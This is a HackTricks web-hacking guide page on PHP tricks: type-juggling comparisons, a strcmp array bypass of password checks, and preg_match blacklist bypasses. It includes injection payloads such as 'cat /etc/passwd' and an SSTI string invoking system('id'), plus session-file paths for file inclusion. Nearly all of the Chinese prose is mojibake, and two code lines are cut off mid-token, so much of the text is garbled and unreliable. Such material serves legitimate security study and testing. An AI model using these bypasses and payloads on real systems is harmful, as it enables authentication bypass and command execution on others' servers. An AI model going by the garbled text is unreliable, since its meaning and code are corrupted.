<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>PHP Tricks</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../../favicon.svg">
        <link rel="shortcut icon" href="../../../favicon.png">
        <link rel="stylesheet" href="../../../css/variables.css">
        <link rel="stylesheet" href="../../../css/general.css">
        <link rel="stylesheet" href="../../../css/chrome.css">
        <link rel="stylesheet" href="../../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../../highlight.css">
        <link rel="stylesheet" href="../../../tomorrow-night.css">
        <link rel="stylesheet" href="../../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="php-tricks"><a class="header" href="#php-tricks">PHP Tricks</a></h1>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="../../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="../../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
<figure><img src="../../../.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
<p><strong>ä»é»‘å®¢çš„è§’åº¦çœ‹å¾…æ‚¨çš„ç½‘ç»œåº”ç”¨ã€ç½‘ç»œå’Œäº‘</strong></p>
<p><strong>æŸ¥æ‰¾å¹¶æŠ¥å‘Šå…·æœ‰å®é™…å•†ä¸šå½±å“çš„å…³é”®å¯åˆ©ç”¨æ¼æ´ã€‚</strong> ä½¿ç”¨æˆ‘ä»¬ 20 å¤šä¸ªè‡ªå®šä¹‰å·¥å…·æ¥æ˜ å°„æ”»å‡»é¢ï¼Œå‘ç°è®©æ‚¨æå‡æƒé™çš„å®‰å…¨é—®é¢˜ï¼Œå¹¶ä½¿ç”¨è‡ªåŠ¨åŒ–åˆ©ç”¨æ”¶é›†é‡è¦è¯æ®ï¼Œå°†æ‚¨çš„è¾›å‹¤å·¥ä½œè½¬åŒ–ä¸ºæœ‰è¯´æœåŠ›çš„æŠ¥å‘Šã€‚</p>
<p>{% embed url="https://pentest-tools.com/?utm_term=jul2024&amp;utm_medium=link&amp;utm_source=hacktricks&amp;utm_campaign=spons" %}</p>
<h2 id="cookies-å¸¸è§ä½ç½®"><a class="header" href="#cookies-å¸¸è§ä½ç½®">Cookies å¸¸è§ä½ç½®ï¼š</a></h2>
<p>è¿™åŒæ ·é€‚ç”¨äº phpMyAdmin cookiesã€‚</p>
<p>Cookies:</p>
<pre><code>PHPSESSID
phpMyAdmin
</code></pre>
<p>ä½ç½®ï¼š</p>
<pre><code>/var/lib/php/sessions
/var/lib/php5/
/tmp/
Example: ../../../../../../tmp/sess_d1d531db62523df80e1153ada1d4b02e
</code></pre>
<h2 id="ç»•è¿‡-php-æ¯”è¾ƒ"><a class="header" href="#ç»•è¿‡-php-æ¯”è¾ƒ">ç»•è¿‡ PHP æ¯”è¾ƒ</a></h2>
<h3 id="æ¾æ•£æ¯”è¾ƒç±»å‹è½¬æ¢---"><a class="header" href="#æ¾æ•£æ¯”è¾ƒç±»å‹è½¬æ¢---">æ¾æ•£æ¯”è¾ƒ/ç±»å‹è½¬æ¢ ( == )</a></h3>
<p>å¦‚æœåœ¨ PHP ä¸­ä½¿ç”¨ <code>==</code>ï¼Œåˆ™ä¼šå‡ºç°ä¸€äº›æ„å¤–æƒ…å†µï¼Œæ¯”è¾ƒçš„è¡Œä¸ºå¹¶ä¸åƒé¢„æœŸé‚£æ ·ã€‚è¿™æ˜¯å› ä¸º "==" åªæ¯”è¾ƒè½¬æ¢ä¸ºç›¸åŒç±»å‹çš„å€¼ï¼Œå¦‚æœä½ è¿˜æƒ³æ¯”è¾ƒè¢«æ¯”è¾ƒæ•°æ®çš„ç±»å‹æ˜¯å¦ç›¸åŒï¼Œä½ éœ€è¦ä½¿ç”¨ <code>===</code>ã€‚</p>
<p>PHP æ¯”è¾ƒè¡¨ï¼š <a href="https://www.php.net/manual/en/types.comparisons.php">https://www.php.net/manual/en/types.comparisons.php</a></p>
<p><img src="../../../.gitbook/assets/image%20(567).png" alt="" /></p>
<p>{% file src="../../../.gitbook/assets/EN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf" %}</p>
<ul>
<li><code>"string" == 0 -&gt; True</code> ä¸€ä¸ªä¸ä»¥æ•°å­—å¼€å¤´çš„å­—ç¬¦ä¸²ç­‰äºä¸€ä¸ªæ•°å­—</li>
<li><code>"0xAAAA" == "43690" -&gt; True</code> ç”±åè¿›åˆ¶æˆ–åå…­è¿›åˆ¶æ ¼å¼çš„æ•°å­—ç»„æˆçš„å­—ç¬¦ä¸²å¯ä»¥ä¸å…¶ä»–æ•°å­—/å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœæ•°å­—ç›¸åŒåˆ™ç»“æœä¸º Trueï¼ˆå­—ç¬¦ä¸²ä¸­çš„æ•°å­—è¢«è§£é‡Šä¸ºæ•°å­—ï¼‰</li>
<li><code>"0e3264578" == 0 --&gt; True</code> ä¸€ä¸ªä»¥ "0e" å¼€å¤´å¹¶åè·Ÿä»»ä½•å†…å®¹çš„å­—ç¬¦ä¸²å°†ç­‰äº 0</li>
<li><code>"0X3264578" == 0X --&gt; True</code> ä¸€ä¸ªä»¥ "0" å¼€å¤´å¹¶åè·Ÿä»»ä½•å­—æ¯ï¼ˆX å¯ä»¥æ˜¯ä»»ä½•å­—æ¯ï¼‰å¹¶åè·Ÿä»»ä½•å†…å®¹çš„å­—ç¬¦ä¸²å°†ç­‰äº 0</li>
<li><code>"0e12334" == "0" --&gt; True</code> è¿™éå¸¸æœ‰è¶£ï¼Œå› ä¸ºåœ¨æŸäº›æƒ…å†µä¸‹ä½ å¯ä»¥æ§åˆ¶ "0" çš„å­—ç¬¦ä¸²è¾“å…¥ä»¥åŠä¸ä¹‹è¿›è¡Œå“ˆå¸Œå’Œæ¯”è¾ƒçš„æŸäº›å†…å®¹ã€‚å› æ­¤ï¼Œå¦‚æœä½ å¯ä»¥æä¾›ä¸€ä¸ªå€¼ï¼Œè¯¥å€¼å°†åˆ›å»ºä¸€ä¸ªä»¥ "0e" å¼€å¤´ä¸”æ²¡æœ‰ä»»ä½•å­—æ¯çš„å“ˆå¸Œï¼Œä½ å¯ä»¥ç»•è¿‡æ¯”è¾ƒã€‚ä½ å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ° <strong>å·²ç»å“ˆå¸Œçš„å­—ç¬¦ä¸²</strong> è¿™ç§æ ¼å¼ï¼š<a href="https://github.com/spaze/hashes">https://github.com/spaze/hashes</a></li>
<li><code>"X" == 0 --&gt; True</code> å­—ç¬¦ä¸²ä¸­çš„ä»»ä½•å­—æ¯ç­‰äº int 0</li>
</ul>
<p>æ›´å¤šä¿¡æ¯è¯·è§ <a href="https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09">https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09</a></p>
<h3 id="in_array"><a class="header" href="#in_array"><strong>in_array()</strong></a></h3>
<p><strong>ç±»å‹è½¬æ¢</strong> ä¹Ÿé»˜è®¤å½±å“ <code>in_array()</code> å‡½æ•°ï¼ˆä½ éœ€è¦å°†ç¬¬ä¸‰ä¸ªå‚æ•°è®¾ç½®ä¸º true ä»¥è¿›è¡Œä¸¥æ ¼æ¯”è¾ƒï¼‰ï¼š</p>
<pre><code class="language-php">$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
</code></pre>
<h3 id="strcmpstrcasecmp"><a class="header" href="#strcmpstrcasecmp">strcmp()/strcasecmp()</a></h3>
<p>å¦‚æœæ­¤å‡½æ•°ç”¨äº<strong>ä»»ä½•èº«ä»½éªŒè¯æ£€æŸ¥</strong>ï¼ˆä¾‹å¦‚æ£€æŸ¥å¯†ç ï¼‰ï¼Œå¹¶ä¸”ç”¨æˆ·æ§åˆ¶æ¯”è¾ƒçš„ä¸€ä¾§ï¼Œä»–å¯ä»¥å‘é€ä¸€ä¸ªç©ºæ•°ç»„è€Œä¸æ˜¯å­—ç¬¦ä¸²ä½œä¸ºå¯†ç çš„å€¼ï¼ˆ<code>https://example.com/login.php/?username=admin&amp;password[]=</code>ï¼‰ï¼Œä»è€Œç»•è¿‡æ­¤æ£€æŸ¥ï¼š</p>
<pre><code class="language-php">if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
</code></pre>
<p>ç›¸åŒçš„é”™è¯¯å‘ç”Ÿåœ¨ <code>strcasecmp()</code></p>
<h3 id="ä¸¥æ ¼ç±»å‹è½¬æ¢"><a class="header" href="#ä¸¥æ ¼ç±»å‹è½¬æ¢">ä¸¥æ ¼ç±»å‹è½¬æ¢</a></h3>
<p>å³ä½¿ä½¿ç”¨ <code>===</code>ï¼Œä¹Ÿå¯èƒ½å‡ºç°é”™è¯¯ï¼Œä½¿å¾—æ¯”è¾ƒå®¹æ˜“å—åˆ°ç±»å‹è½¬æ¢çš„å½±å“ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ¯”è¾ƒæ˜¯åœ¨æ¯”è¾ƒä¹‹å‰å°†æ•°æ®è½¬æ¢ä¸ºä¸åŒç±»å‹çš„å¯¹è±¡ï¼š</p>
<pre><code class="language-php">(int) "1abc" === (int) "1xyz" //This will be true
</code></pre>
<h3 id="preg_match"><a class="header" href="#preg_match">preg_match(/^.*/)</a></h3>
<p><strong><code>preg_match()</code></strong> å¯ä»¥ç”¨æ¥ <strong>éªŒè¯ç”¨æˆ·è¾“å…¥</strong>ï¼ˆå®ƒ <strong>æ£€æŸ¥</strong> æ˜¯å¦æœ‰ä»»ä½• <strong>å•è¯/æ­£åˆ™è¡¨è¾¾å¼</strong> åœ¨ <strong>é»‘åå•</strong> ä¸­ <strong>å­˜åœ¨</strong> äº <strong>ç”¨æˆ·è¾“å…¥</strong> ä¸­ï¼Œå¦‚æœæ²¡æœ‰ï¼Œä»£ç å¯ä»¥ç»§ç»­æ‰§è¡Œï¼‰ã€‚</p>
<h4 id="new-line-bypass"><a class="header" href="#new-line-bypass">New line bypass</a></h4>
<p>ç„¶è€Œï¼Œå½“é™å®šæ­£åˆ™è¡¨è¾¾å¼çš„å¼€å§‹æ—¶ï¼Œ<code>preg_match()</code> <strong>åªæ£€æŸ¥ç”¨æˆ·è¾“å…¥çš„ç¬¬ä¸€è¡Œ</strong>ï¼Œå› æ­¤å¦‚æœä½ èƒ½å¤Ÿä»¥ <strong>å¤šè¡Œ</strong> å‘é€è¾“å…¥ï¼Œä½ å¯èƒ½èƒ½å¤Ÿç»•è¿‡è¿™ä¸ªæ£€æŸ¥ã€‚ç¤ºä¾‹ï¼š</p>
<pre><code class="language-php">$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --&gt; In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --&gt; In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --&gt; In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --&gt; In this scenario preg_match DOESN'T find the char "1"
</code></pre>
<p>è¦ç»•è¿‡æ­¤æ£€æŸ¥ï¼Œæ‚¨å¯ä»¥<strong>å‘é€å¸¦æœ‰æ¢è¡Œç¬¦çš„ URL ç¼–ç å€¼</strong>ï¼ˆ<code>%0A</code>ï¼‰ï¼Œæˆ–è€…å¦‚æœæ‚¨å¯ä»¥å‘é€<strong>JSON æ•°æ®</strong>ï¼Œåˆ™å°†å…¶åˆ†æˆ<strong>å¤šè¡Œ</strong>ï¼š</p>
<pre><code class="language-php">{
"cmd": "cat /etc/passwd"
}
</code></pre>
<p>æ‰¾åˆ°ä¸€ä¸ªä¾‹å­åœ¨è¿™é‡Œ: <a href="https://ramadistra.dev/fbctf-2019-rceservice">https://ramadistra.dev/fbctf-2019-rceservice</a></p>
<h4 id="é•¿åº¦é”™è¯¯ç»•è¿‡"><a class="header" href="#é•¿åº¦é”™è¯¯ç»•è¿‡"><strong>é•¿åº¦é”™è¯¯ç»•è¿‡</strong></a></h4>
<p>ï¼ˆè¿™ä¸ªç»•è¿‡æ˜¾ç„¶æ˜¯åœ¨ PHP 5.2.5 ä¸Šå°è¯•çš„ï¼Œæˆ‘æ— æ³•åœ¨ PHP 7.3.15 ä¸Šä½¿å…¶å·¥ä½œï¼‰<br />
å¦‚æœä½ å¯ä»¥å‘é€ä¸€ä¸ªæœ‰æ•ˆçš„éå¸¸ <strong>å¤§çš„è¾“å…¥</strong> ç»™ <code>preg_match()</code>ï¼Œå®ƒ <strong>å°†æ— æ³•å¤„ç†å®ƒ</strong>ï¼Œä½ å°†èƒ½å¤Ÿ <strong>ç»•è¿‡</strong> æ£€æŸ¥ã€‚ä¾‹å¦‚ï¼Œå¦‚æœå®ƒæ­£åœ¨é»‘åå•ä¸€ä¸ª JSONï¼Œä½ å¯ä»¥å‘é€ï¼š</p>
<pre><code class="language-bash">payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000001 + '"}'
</code></pre>
<p>From: <a href="https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0">https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0</a></p>
<h4 id="redos-ç»•è¿‡"><a class="header" href="#redos-ç»•è¿‡">ReDoS ç»•è¿‡</a></h4>
<p>Trick from: <a href="https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223">https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223</a> and <a href="https://mizu.re/post/pong">https://mizu.re/post/pong</a></p>
<figure><img src="../../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>
<p>ç®€è€Œè¨€ä¹‹ï¼Œé—®é¢˜å‘ç”Ÿæ˜¯å› ä¸º PHP ä¸­çš„ <code>preg_*</code> å‡½æ•°åŸºäº <a href="http://www.pcre.org/">PCRE åº“</a>ã€‚åœ¨ PCRE ä¸­ï¼ŒæŸäº›æ­£åˆ™è¡¨è¾¾å¼é€šè¿‡å¤§é‡é€’å½’è°ƒç”¨è¿›è¡ŒåŒ¹é…ï¼Œè¿™ä¼šæ¶ˆè€—å¤§é‡çš„æ ˆç©ºé—´ã€‚å¯ä»¥è®¾ç½®å…è®¸çš„é€’å½’æ¬¡æ•°é™åˆ¶ï¼Œä½†åœ¨ PHP ä¸­ï¼Œè¿™ä¸ªé™åˆ¶ <a href="http://php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit">é»˜è®¤ä¸º 100,000</a>ï¼Œè¿™è¶…è¿‡äº†æ ˆçš„å®¹é‡ã€‚</p>
<p><a href="http://stackoverflow.com/questions/7620910/regexp-in-preg-match-function-returning-browser-error">è¿™ä¸ª Stackoverflow çº¿ç¨‹</a> ä¹Ÿåœ¨å¸–å­ä¸­è¢«é“¾æ¥ï¼Œæ·±å…¥è®¨è®ºäº†è¿™ä¸ªé—®é¢˜ã€‚æˆ‘ä»¬çš„ä»»åŠ¡ç°åœ¨å¾ˆæ˜ç¡®ï¼š<br />
<strong>å‘é€ä¸€ä¸ªè¾“å…¥ï¼Œä½¿æ­£åˆ™è¡¨è¾¾å¼è¿›è¡Œ 100_000+ æ¬¡é€’å½’ï¼Œå¯¼è‡´ SIGSEGVï¼Œä½¿å¾— <code>preg_match()</code> å‡½æ•°è¿”å› <code>false</code>ï¼Œä»è€Œä½¿åº”ç”¨ç¨‹åºè®¤ä¸ºæˆ‘ä»¬çš„è¾“å…¥ä¸æ˜¯æ¶æ„çš„ï¼Œåœ¨æœ‰æ•ˆè´Ÿè½½çš„æœ€åæŠ›å‡ºç±»ä¼¼ <code>{system(&lt;verybadcommand&gt;)}</code> çš„æƒŠå–œä»¥è·å– SSTI --&gt; RCE --&gt; flag :)</strong>ã€‚</p>
<p>å¥½å§ï¼Œä»æ­£åˆ™è¡¨è¾¾å¼çš„è§’åº¦æ¥çœ‹ï¼Œæˆ‘ä»¬å®é™…ä¸Šå¹¶æ²¡æœ‰è¿›è¡Œ 100k æ¬¡â€œé€’å½’â€ï¼Œè€Œæ˜¯è®¡ç®—â€œå›æº¯æ­¥éª¤â€ï¼Œæ­£å¦‚ <a href="https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit">PHP æ–‡æ¡£</a> æ‰€è¿°ï¼Œå®ƒåœ¨ <code>pcre.backtrack_limit</code> å˜é‡ä¸­é»˜è®¤ä¸º 1_000_000ï¼ˆ1Mï¼‰ã€‚<br />
è¦è¾¾åˆ°è¿™ä¸ªï¼Œ<code>'X'*500_001</code> å°†å¯¼è‡´ 100 ä¸‡ä¸ªå›æº¯æ­¥éª¤ï¼ˆ50ä¸‡å‘å‰å’Œ50ä¸‡å‘åï¼‰ï¼š</p>
<pre><code class="language-python">payload = f"@dimariasimone on{'X'*500_001} {{system('id')}}"
</code></pre>
<h3 id="phpæ··æ·†çš„ç±»å‹æ··åˆ"><a class="header" href="#phpæ··æ·†çš„ç±»å‹æ··åˆ">PHPæ··æ·†çš„ç±»å‹æ··åˆ</a></h3>
<pre><code class="language-php">$obfs = "1"; //string "1"
$obfs++; //int 2
$obfs += 0.2; //float 2.2
$obfs = 1 + "7 IGNORE"; //int 8
$obfs = "string" + array("1.1 striiing")[0]; //float 1.1
$obfs = 3+2 * (TRUE + TRUE); //int 7
$obfs .= ""; //string "7"
$obfs += ""; //int 7
</code></pre>
<h2 id="execute-after-redirect-ear"><a class="header" href="#execute-after-redirect-ear">Execute After Redirect (EAR)</a></h2>
<p>å¦‚æœ PHP æ­£åœ¨é‡å®šå‘åˆ°å¦ä¸€ä¸ªé¡µé¢ï¼Œä½†åœ¨è®¾ç½®å¤´éƒ¨ <code>Location</code> ä¹‹åæ²¡æœ‰è°ƒç”¨ <strong><code>die</code></strong> æˆ– <strong><code>exit</code></strong> å‡½æ•°ï¼ŒPHP å°†ç»§ç»­æ‰§è¡Œå¹¶å°†æ•°æ®é™„åŠ åˆ°ä¸»ä½“ï¼š</p>
<pre><code class="language-php">&lt;?php
// In this page the page will be read and the content appended to the body of
// the redirect response
$page = $_GET['page'];
header('Location: /index.php?page=default.html');
readfile($page);
?&gt;
</code></pre>
<h2 id="è·¯å¾„éå†å’Œæ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨"><a class="header" href="#è·¯å¾„éå†å’Œæ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨">è·¯å¾„éå†å’Œæ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨</a></h2>
<p>æ£€æŸ¥ï¼š</p>
<p>{% content-ref url="../../../pentesting-web/file-inclusion/" %}
<a href="../../../pentesting-web/file-inclusion/">file-inclusion</a>
{% endcontent-ref %}</p>
<h2 id="æ›´å¤šæŠ€å·§"><a class="header" href="#æ›´å¤šæŠ€å·§">æ›´å¤šæŠ€å·§</a></h2>
<ul>
<li><strong>register_globals</strong>: åœ¨ <strong>PHP &lt; 4.1.1.1</strong> æˆ–è€…å¦‚æœé…ç½®é”™è¯¯ï¼Œ<strong>register_globals</strong> å¯èƒ½æ˜¯æ¿€æ´»çš„ï¼ˆæˆ–è€…å…¶è¡Œä¸ºè¢«æ¨¡æ‹Ÿï¼‰ã€‚è¿™æ„å‘³ç€åœ¨å…¨å±€å˜é‡å¦‚ $_GET ä¸­ï¼Œå¦‚æœå®ƒä»¬æœ‰å€¼ï¼Œä¾‹å¦‚ $_GET["param"]="1234"ï¼Œä½ å¯ä»¥é€šè¿‡ <strong>$param è®¿é—®å®ƒã€‚å› æ­¤ï¼Œé€šè¿‡å‘é€ HTTP å‚æ•°ï¼Œä½ å¯ä»¥è¦†ç›–</strong> åœ¨ä»£ç ä¸­ä½¿ç”¨çš„å˜é‡ã€‚</li>
<li><strong>åŒä¸€åŸŸçš„ PHPSESSION cookies å­˜å‚¨åœ¨åŒä¸€ä½ç½®</strong>ï¼Œå› æ­¤å¦‚æœåœ¨ä¸€ä¸ªåŸŸä¸­ <strong>ä¸åŒçš„ cookies åœ¨ä¸åŒçš„è·¯å¾„ä¸­ä½¿ç”¨</strong>ï¼Œä½ å¯ä»¥ä½¿è¯¥è·¯å¾„ <strong>è®¿é—®è¯¥è·¯å¾„çš„ cookie</strong>ï¼Œè®¾ç½®å…¶ä»–è·¯å¾„ cookie çš„å€¼ã€‚<br />
è¿™æ ·ï¼Œå¦‚æœ <strong>ä¸¤ä¸ªè·¯å¾„è®¿é—®åŒåçš„å˜é‡</strong>ï¼Œä½ å¯ä»¥ä½¿ <strong>è·¯å¾„1ä¸­çš„è¯¥å˜é‡çš„å€¼åº”ç”¨äºè·¯å¾„2</strong>ã€‚ç„¶åè·¯å¾„2å°†è§†è·¯å¾„1çš„å˜é‡ä¸ºæœ‰æ•ˆï¼ˆé€šè¿‡ç»™ cookie èµ‹äºˆåœ¨è·¯å¾„2ä¸­å¯¹åº”çš„åç§°ï¼‰ã€‚</li>
<li>å½“ä½ æ‹¥æœ‰æœºå™¨ç”¨æˆ·çš„ <strong>ç”¨æˆ·å</strong> æ—¶ã€‚æ£€æŸ¥åœ°å€ï¼š<strong>/~&lt;USERNAME&gt;</strong> ä»¥æŸ¥çœ‹ php ç›®å½•æ˜¯å¦è¢«æ¿€æ´»ã€‚</li>
<li><a href="../../../pentesting-web/file-inclusion/"><strong>ä½¿ç”¨ php åŒ…è£…å™¨çš„ LFI å’Œ RCE</strong></a></li>
</ul>
<h3 id="password_hashpassword_verify"><a class="header" href="#password_hashpassword_verify">password_hash/password_verify</a></h3>
<p>è¿™äº›å‡½æ•°é€šå¸¸åœ¨ PHP ä¸­ç”¨äº <strong>ä»å¯†ç ç”Ÿæˆå“ˆå¸Œ</strong> å¹¶ <strong>æ£€æŸ¥</strong> å¯†ç æ˜¯å¦ä¸å“ˆå¸Œç›¸ç¬¦ã€‚<br />
æ”¯æŒçš„ç®—æ³•æœ‰ï¼š<code>PASSWORD_DEFAULT</code> å’Œ <code>PASSWORD_BCRYPT</code>ï¼ˆä»¥ <code>$2y$</code> å¼€å¤´ï¼‰ã€‚è¯·æ³¨æ„ï¼Œ<strong>PASSWORD_DEFAULT é€šå¸¸ä¸ PASSWORD_BCRYPT ç›¸åŒã€‚</strong> ç›®å‰ï¼Œ<strong>PASSWORD_BCRYPT</strong> åœ¨è¾“å…¥ä¸Šæœ‰ <strong>72å­—èŠ‚çš„å¤§å°é™åˆ¶</strong>ã€‚å› æ­¤ï¼Œå½“ä½ å°è¯•ç”¨æ­¤ç®—æ³•å¯¹å¤§äº 72 å­—èŠ‚çš„å†…å®¹è¿›è¡Œå“ˆå¸Œæ—¶ï¼Œä»…ä¼šä½¿ç”¨å‰ 72Bï¼š</p>
<pre><code class="language-php">$cont=71; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
False

$cont=72; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
True
</code></pre>
<h3 id="http-headers-bypass-abusing-php-errors"><a class="header" href="#http-headers-bypass-abusing-php-errors">HTTP headers bypass abusing PHP errors</a></h3>
<h4 id="causing-error-after-setting-headers"><a class="header" href="#causing-error-after-setting-headers">Causing error after setting headers</a></h4>
